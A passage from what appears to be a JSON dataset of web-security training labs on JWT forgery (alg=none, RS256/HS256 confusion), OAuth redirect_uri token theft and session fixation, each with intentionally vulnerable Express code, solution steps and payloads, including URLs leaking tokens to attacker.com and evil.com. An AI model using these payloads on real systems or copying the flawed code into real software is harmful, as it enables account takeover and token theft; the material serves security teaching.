        "Lab scenario": "JWT algorithm confusion leads to authentication bypass",
      
        "Lab Description": "The application uses JWTs for session management but accepts both RS256 and HS256 algorithms interchangeably. The backend uses RS256 with a public key to validate tokens, but it fails to enforce the algorithm type. The application naively uses the public key as a secret when validating HS256 tokens. To solve: craft a forged JWT to log in as the administrator user.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Burp Suite to intercept the JWT from a valid session and decode it using jwt.io.",
          "Verify the 'alg' field is set to RS256 and identify that the application uses a public key endpoint for JWT verification.",
          "Craft a malicious JWT with the algorithm set to HS256 and use the public key (downloaded from the /jwks endpoint) as the HMAC secret.",
          "Generate a token with { \"username\": \"admin\" } as the payload and sign it using HS256 with the public key as the secret in jwt.io.",
          "Replace the JWT in your session cookie with the forged token and access /admin to verify success."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.use(require('cookie-parser')()); app.get('/profile', (req, res) => { const token = req.cookies.auth; try { const decoded = jwt.verify(token, publicKey); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
      
        "payloads": [
          "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"username\": \"admin\" }.[HMAC-SHA256 signature using public key]",
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0=[forged signature using public key as secret]"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in redirect URI validation allows token theft",
      
        "Lab Description": "This lab simulates a vulnerable OAuth 2.0 implicit grant implementation where the redirect URI is weakly validated using substring matching. An attacker can register a malicious endpoint with a similar domain and capture access tokens. To solve: hijack the victim’s OAuth access token and access their private dashboard.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use Burp Suite to inspect the /oauth/authorize flow and observe the redirect_uri parameter.",
          "Register a malicious domain that contains the legitimate redirect URI as a substring (e.g., legit.example.com.attacker.com).",
          "Craft an OAuth authorization request with the manipulated redirect_uri pointing to your domain.",
          "Send the crafted URL to a victim user and capture the fragment containing the access_token on your server.",
          "Use Postman to access /api/dashboard with the stolen access token in the Authorization header to confirm access."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; if (!redirect_uri.includes('https://legit.example.com/callback')) return res.status(400).send('Invalid redirect'); const token = 'access_token=abc123'; res.redirect(`${redirect_uri}#${token}`); }); app.get('/api/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123') res.send('Sensitive dashboard data'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
      
        "payloads": [
          "https://legit.example.com.attacker.com/callback#access_token=abc123",
          "https://oauth.example.com/authorize?client_id=xyz&redirect_uri=https://legit.example.com.attacker.com/callback&response_type=token"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login endpoint",
      
        "Lab Description": "The application assigns a session ID before authentication and fails to regenerate it after login. An attacker can set a session ID for a victim and wait for them to log in. To solve: fixate a session for the victim, log in with it, and access their profile page.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use Burp Suite to intercept the login flow and observe the session cookie being preserved before and after login.",
          "Send a crafted session ID to the victim via a phishing link or CSRF attack with document.cookie injection.",
          "Wait for the victim to log in while using the pre-assigned session ID.",
          "Use the same session ID in your browser to hijack the session after the victim authenticates.",
          "Access /profile to retrieve the victim's information and verify lab success."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); const sessions = {}; const users = { 'carlos': 's3cr3t' }; app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substr(2); res.cookie('session', sid); sessions[sid] = { authenticated: false, user: null }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = { authenticated: true, user: username }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/profile', (req, res) => { const sid = req.cookies.session; const sess = sessions[sid]; if (sess && sess.authenticated) res.send(`Welcome ${sess.user}`); else res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      
        "payloads": [
          "document.cookie='session=attacker123';",
          "POST /login with Cookie: session=attacker123 and valid credentials for victim",
          "Access /profile with Cookie: session=attacker123"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via 'none' algorithm in Authorization header",
        "Lab Description": "The application uses JWTs for session management but incorrectly accepts tokens with 'alg':'none'. The vulnerable Express middleware does not verify the JWT signature properly when the 'none' algorithm is provided. The application accepts any token with a valid payload and no signature. To solve: forge a valid token impersonating the user 'carlos' and access their dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the GET /dashboard request and capture the JWT in the Authorization header.",
          "2. Decode the token using jwt.io and examine the algorithm and payload structure.",
          "3. Replace the algorithm in the header with 'none' and modify the payload to { \"username\": \"carlos\" }.",
          "4. Remove the signature part completely and re-encode the token (header.payload).",
          "5. Send a new request to /dashboard with the forged JWT in the Authorization header. Confirm access to Carlos's dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; const users = { carlos: 'admin', wiener: 'user' }; app.get('/dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = decoded.username; return res.send(`Welcome to ${req.user}'s dashboard`); } const verified = jwt.verify(token, secret); req.user = verified.username; res.send(`Welcome to ${req.user}'s dashboard`); } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow misconfiguration leaks token via referrer header",
        "Lab Description": "This OAuth-enabled app uses the implicit flow for authentication, where access tokens are returned in the URL fragment. However, it fails to sanitize or block third-party redirects that leak the access token via the Referer header. To solve: extract the victim's token by abusing an open redirect and access their account using it.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP to spider the application and discover an open redirect at /redirect?next=https://attacker.com.",
          "2. Send the OAuth login request and observe that the access token is included in the fragment after redirect_uri.",
          "3. Create a phishing page that includes a link to the vulnerable redirect: /redirect?next=https://attacker.com#access_token=...",
          "4. When the victim clicks the link, the browser sends the full URL (with token fragment) as the Referer.",
          "5. Capture the token from the request to https://attacker.com and use it in the Authorization header to access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const tokens = { 'carlos-token': 'carlos', 'wiener-token': 'wiener' }; app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const user = req.query.user; if (!redirectUri || !user) return res.status(400).send('Invalid request'); const token = user + '-token'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('Missing token'); const user = tokens[auth.split(' ')[1]]; if (!user) return res.status(401).send('Invalid token'); res.send(`Welcome ${user}`); }); app.get('/redirect', (req, res) => { const next = req.query.next; res.redirect(next); }); app.listen(4000);",
        "payloads": [
          "/redirect?next=https://evil.com#access_token=carlos-token",
          "https://vulnerable.com/oauth/callback?user=carlos&redirect_uri=https://evil.com"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login response",
        "Lab Description": "This application assigns a fixed session ID before login and reuses it even after authentication, allowing session fixation. An attacker can send a victim a pre-established session and later hijack it once they log in. To solve: fixate a session ID, have the victim authenticate using it, then access their account using the same ID.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to send a GET request to /login and capture the Set-Cookie header. Note the session ID (e.g., session=attacker123).",
          "2. Send a phishing link to the victim that sets the cookie value attacker123 before redirecting to the login page.",
          "3. Once the victim logs in, the session ID remains attacker123 due to improper re-initialization.",
          "4. Use the same session ID (attacker123) in your browser or with curl/Postman and access /my-account.",
          "5. Confirm hijacked access to the victim’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || 'attacker123'; res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly`); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid]) res.send(`Welcome ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
        "payloads": [
          "Cookie: session=attacker123",
          "https://vulnerable-app.com/login (with session=attacker123 set beforehand)"
        ]
      },
      {
        "Lab scenario": "JWT token none algorithm bypass in stateless authentication",
        "Lab Description": "The stateless JWT-based authentication mechanism fails to validate the algorithm specified in the JWT header. The application accepts unsigned tokens if the algorithm is set to 'none'. To solve: forge a token to access the admin's account dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a valid login request and extract the JWT from the Authorization header.",
          "Copy the token and decode it using jwt.io or a Burp extension like JSON Web Tokens.",
          "Modify the payload to impersonate the admin user and change the 'alg' value in the JWT header to 'none'.",
          "Remove the signature section of the JWT, re-encode the token, and replace the original Authorization header with your forged one in Burp Repeater.",
          "Send the request to /admin-dashboard and verify successful access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Admin Dashboard Access Granted'); } try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Admin Dashboard Access Granted'); else return res.status(403).send('Insufficient Role'); } catch (err) { return res.status(401).send('Invalid Token'); } }); app.listen(3001, () => console.log('JWT None Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login flow",
        "Lab Description": "The login process does not generate a new session identifier after authentication. This allows an attacker to fix a session for a victim before they log in. To solve: log in as Carlos using a session fixation attack.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to access the login page and capture a session cookie before authentication.",
          "Send the session URL to the victim via a reflected XSS or phishing vector (simulated for the lab).",
          "Log in to your own account with a fixed session cookie and observe no change in session ID.",
          "Use the same session ID to log in as Carlos (credentials known or guessed).",
          "Visit /my-account using the fixed session to confirm access to Carlos’s data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const users = [{ username: 'carlos', password: 's3cret' }]; app.use(session({ secret: 'keyboardcat', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') return res.send('Account details for carlos'); res.send('Not authorized'); }); app.listen(3002, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "GET /login HTTP/1.1\\nCookie: connect.sid=attackersession123",
          "POST /login HTTP/1.1\\nCookie: connect.sid=attackersession123\\nusername=carlos&password=s3cret",
          "GET /my-account HTTP/1.1\\nCookie: connect.sid=attackersession123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leaking access tokens via redirect URI manipulation",
        "Lab Description": "The application uses an OAuth 2.0 provider to log users in. The 'redirect_uri' parameter is not properly validated, allowing attackers to capture tokens by injecting malicious URLs. To solve: steal Carlos’s access token using an open redirect exploit.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth login flow and identify the redirect_uri parameter in the authorization request.",
          "Modify the redirect_uri to an attacker-controlled domain (use https://exploit-server.net/capture).",
          "Send the modified authorization URL to the victim or trigger their login.",
          "Use the Exploit Server to monitor captured GET requests containing the access token in the URL fragment.",
          "Replay the token in a request to /me endpoint to verify you are impersonating Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const token = 'access-token-carlos'; const uri = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(uri); }); app.get('/me', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer access-token-carlos') return res.send('Welcome Carlos!'); res.status(403).send('Unauthorized'); }); app.listen(3003, () => console.log('OAuth Redirect Lab running'));",
        "payloads": [
          "https://vulnerable-app.com/auth?client_id=abc123&redirect_uri=https://exploit-server.net/capture&state=xyz",
          "GET /me HTTP/1.1\\nAuthorization: Bearer access-token-carlos"
        ]
      },
      {
        "Lab scenario": "JWT token tampering in Authorization header",
        "Lab Description": "The backend uses a stateless JWT-based authentication mechanism, but it fails to validate the token's signature. The application blindly trusts the header and payload claims of the JWT token. To solve: Forge an admin-level token and access the /admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture a valid JWT from a normal login session and send the request to Repeater.",
          "Analyze the token on https://jwt.io and note that it's signed with 'none' algorithm.",
          "Modify the JWT payload to set {\"role\":\"admin\"} and change the alg field in the header to 'none'. Remove the signature portion.",
          "Replace the original token with the tampered unsigned JWT in the Authorization header.",
          "Send the request to /admin and verify access is granted by confirming 'Admin Dashboard' appears in the response."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload.role === 'admin') { return res.send('Admin Dashboard'); } res.status(403).send('Forbidden'); }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
          "eyJhbGciOiJub25lIn0.eyJ1aWQiOiIxIiwicm9sZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in token exchange",
        "Lab Description": "The application uses OAuth 2.0 to authenticate users via a third-party provider. However, it incorrectly trusts the client-provided access token without verifying it with the OAuth server. To solve: Use a token from your own OAuth account and impersonate Carlos.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to log in via OAuth using your own account and intercept the /oauth/callback request.",
          "Extract your access token and note the JWT payload structure from the Authorization header.",
          "Modify the token payload using https://jwt.io and change the email or sub field to 'carlos@example.com'. Re-encode the JWT with 'none' as the algorithm.",
          "Submit the modified token in the Authorization header to the /profile endpoint.",
          "Verify that Carlos’s profile data is returned, confirming token trust abuse."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/profile', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded && decoded.email) { return res.send(`User profile: ${decoded.email}`); } res.status(401).send('Invalid token'); }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSJ9.",
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via login endpoint",
        "Lab Description": "The application issues session identifiers before authentication and fails to regenerate them upon successful login. An attacker can set a known session ID, trick a victim into using it, and take over their session post-login. To solve: Fix a session ID and hijack Carlos's session after he logs in.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to proxy your traffic and observe that the server issues a session cookie even before login.",
          "Manually set a crafted session ID in the Cookie header using ZAP and visit the login page.",
          "Trick Carlos into logging in while using the fixed session ID (e.g., via CSRF, phishing, etc.).",
          "After Carlos logs in, use the same session ID to access /my-account.",
          "Confirm that Carlos's account data is returned using the fixed session cookie."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'abc123', resave: false, saveUninitialized: true })); app.use(require('body-parser').urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Account: ${req.session.user}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
        "payloads": [
          "Cookie: connect.sid=attackersession123",
          "Cookie: connect.sid=knownsessionid456",
          "Cookie: connect.sid=hijackedsession789"
        ]
      },
      {
        "Lab scenario": "OAuth session fixation via predictable redirect URI",
      
        "Lab Description": "The application integrates a third-party OAuth provider for authentication. However, it fails to validate the `state` parameter during the OAuth flow and reuses a fixed session value across users. The application establishes a session cookie before authentication completion. To solve: force Carlos to log in through a manipulated link and hijack his session to access /my-account.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use OWASP ZAP to proxy the OAuth login process and observe that the `state` parameter is missing or not validated.",
          "Capture the OAuth login redirect request and notice a fixed session cookie issued pre-authentication.",
          "Craft a malicious link embedding the session cookie and redirect_uri that points to the victim's login flow.",
          "Send the crafted link to Carlos via social engineering (email simulation link).",
          "Wait for Carlos to authenticate and reuse the fixed session token to access /my-account."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/oauth/start', (req, res) => { const sessionId = 'predictable-session'; res.cookie('session', sessionId); res.redirect('https://oauth.provider.com/auth?redirect_uri=http://localhost:4000/oauth/callback'); }); app.get('/oauth/callback', (req, res) => { const { code } = req.query; if (code) { const user = 'carlos'; sessions['predictable-session'] = user; res.redirect('/my-account'); } else { res.send('Missing OAuth code'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send('Account page for ' + user); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Fixation Lab running on http://localhost:' + PORT));",
      
        "payloads": [
          "https://target.com/oauth/start?redirect_uri=http://target.com/oauth/callback",
          "Set-Cookie: session=predictable-session",
          "http://target.com/oauth/start?session=predictable-session"
        ]
      },
      {
        "Lab scenario": "JWT token tampering via algorithm confusion in token verification logic",
      
        "Lab Description": "The server accepts JWTs for authentication and incorrectly supports multiple algorithms for signature verification. It uses a public RSA key but also accepts `alg=HS256`, allowing attackers to forge tokens by abusing algorithm confusion. To solve: log in as Carlos by crafting a malicious JWT using `HS256` and the server's public key as the HMAC secret.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use Burp Suite to intercept a valid JWT after logging in as a regular user.",
          "Decode the token using jwt.io and note it uses `RS256` with a known public key exposed in `.well-known/jwks.json`.",
          "Change the `alg` header to `HS256`, modify the payload `sub` to `carlos`.",
          "Use the RSA public key as the HMAC secret and sign the token using any JWT library (e.g., jwt.io debugger or PyJWT).",
          "Replay the forged JWT in Authorization: Bearer header and access /my-account."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.sub === 'carlos') return res.send('Welcome Carlos!'); else return res.send('Welcome ' + decoded.sub); } catch (e) { return res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Confusion Lab running on http://localhost:' + PORT));",
      
        "payloads": [
          "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
          "Payload: { \"sub\": \"carlos\" }",
          "HMAC Key: contents of public.pem used as secret"
        ]
      },
      {
        "Lab scenario": "Session ID leakage through verbose error logging",
      
        "Lab Description": "The application logs errors and includes session IDs in stack traces and debug outputs. When a malformed request is sent, the session ID of the logged-in user is exposed via `/logs`. To solve: extract Carlos’s session ID from the logs and reuse it to impersonate him and access his account.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Postman to send malformed JSON requests to `/update-profile` while Carlos is logged in.",
          "Force a server-side exception which includes the session ID in the error stack trace.",
          "Access the `/logs` endpoint and extract the session identifier associated with Carlos.",
          "Set a cookie manually in the browser or via Burp using the stolen session ID.",
          "Visit /my-account to confirm session takeover."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const fs = require('fs'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const sessions = { 'sess-abc123': 'carlos' }; app.post('/update-profile', (req, res) => { try { const { name } = req.body; if (!name) throw new Error('Invalid name'); res.send('Updated'); } catch (err) { fs.appendFileSync('logs.txt', `Error for session ${req.cookies.session}: ${err.stack}\\n`); res.status(500).send('Server error'); } }); app.get('/logs', (req, res) => { const logs = fs.readFileSync('logs.txt', 'utf-8'); res.send('<pre>' + logs + '</pre>'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Logging Lab running on http://localhost:' + PORT));",
      
        "payloads": [
          "POST /update-profile with invalid JSON to force log entry",
          "GET /logs to leak 'sess-abc123'",
          "Set-Cookie: session=sess-abc123"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login endpoint",
      
        "Lab Description": "This application's session management logic does not regenerate session tokens upon login, allowing session fixation attacks. The application accepts session tokens passed in cookies and maintains them post-authentication without validation. To solve: Hijack Carlos's session using a pre-set session ID.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use OWASP ZAP to spider the application and locate all endpoints related to session handling.",
          "Use Burp Suite to intercept the login process and observe that the session ID remains the same before and after successful login.",
          "Craft a login URL that sets a known session ID using: GET /login?fixsession=abc123",
          "Send the crafted session ID to Carlos via social engineering (simulated by manual cookie setup in lab)",
          "Once Carlos logs in using the fixed session ID, reuse the same ID to access /my-account as Carlos"
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'welcome123' }]; const sessions = {}; app.get('/login', (req, res) => { const { fixsession } = req.query; if (fixsession) { res.cookie('session_id', fixsession); res.send('Session set'); return; } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const session = req.cookies.session_id || Math.random().toString(36).substring(2); sessions[session] = username; res.cookie('session_id', session); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session_id]; if (username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
      
        "payloads": [
          "GET /login?fixsession=fixme123",
          "Cookie: session_id=fixme123",
          "POST /login with carlos credentials while fixsession=fixme123",
          "Reuse Cookie: session_id=fixme123 to GET /my-account"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via algorithm confusion",
      
        "Lab Description": "This application's JWT implementation accepts tokens signed using either HMAC or RSA, but fails to enforce algorithm restrictions securely. The application uses an insecure library that trusts the alg header from the user. To solve: Forge a valid JWT with alg=none to access Carlos's admin page.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Postman to retrieve a valid JWT token from /login for your own account and inspect its header and payload.",
          "Decode the JWT using jwt.io and note that the algorithm used is RS256.",
          "Manually modify the header to {\"alg\":\"none\"} and set the payload to {\"username\":\"carlos\",\"role\":\"admin\"}.",
          "Use Burp Suite to replace the Authorization: Bearer token with your crafted JWT and send request to /admin-dashboard",
          "Confirm the bypass worked by observing Carlos's dashboard"
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const PRIVATE_KEY = require('fs').readFileSync('private.key'); const users = [{ username: 'carlos', password: 'jwtpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, PRIVATE_KEY, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, PRIVATE_KEY, { algorithms: ['RS256', 'HS256'] }); if (decoded.role === 'admin') { res.send('Welcome to Carlos’s Admin Dashboard'); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Algorithm Confusion Lab running at http://localhost:${PORT}`));",
      
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
          "JWT: base64url(header) + '.' + base64url(payload) + '.'",
          "Authorization: Bearer <forged_jwt>",
          "GET /admin-dashboard with forged JWT"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leaking access token via redirect",
      
        "Lab Description": "This application uses OAuth 2.0 for login but does not validate the redirect_uri properly, allowing attackers to leak access tokens to external sites. The application supports login via third-party OAuth providers and accepts dynamic redirect URIs. To solve: Leak Carlos's OAuth token to your controlled server.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth flow after initiating login via 'Login with OAuth'.",
          "Observe that the redirect_uri parameter is not restricted to a specific domain or exact match.",
          "Change the redirect_uri to a domain under your control (e.g. attacker.com/steal).",
          "Send a phishing link to Carlos (simulated by manual navigation) with modified redirect_uri to leak the access token.",
          "Monitor your server logs for the leaked access token, then use it to call /oauth/userinfo as Carlos"
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = [{ username: 'carlos', oauthToken: 'token123' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const token = 'token123'; const uri = `${redirect_uri}?access_token=${token}&state=${state}`; res.redirect(uri); }); app.get('/oauth/userinfo', (req, res) => { const token = req.query.access_token; if (token === 'token123') { res.send('Carlos Account Info'); } else { res.status(403).send('Invalid token'); } }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth Redirect Leak Lab running on http://localhost:${PORT}`));",
      
        "payloads": [
          "GET /oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/steal&state=xyz",
          "Leak URL: https://lab-site/oauth/authorize?...",
          "Intercepted access_token=token123",
          "GET /oauth/userinfo?access_token=token123"
        ]
      },
      {
        "Lab scenario": "JWT signature verification bypass in API Gateway",
        "Lab Description": "The application uses JWTs for API authentication but improperly trusts the `alg` field without enforcing the expected signing algorithm. The application accepts tokens signed with 'none'. To solve: Forge a JWT to impersonate the admin user and access the admin dashboard endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
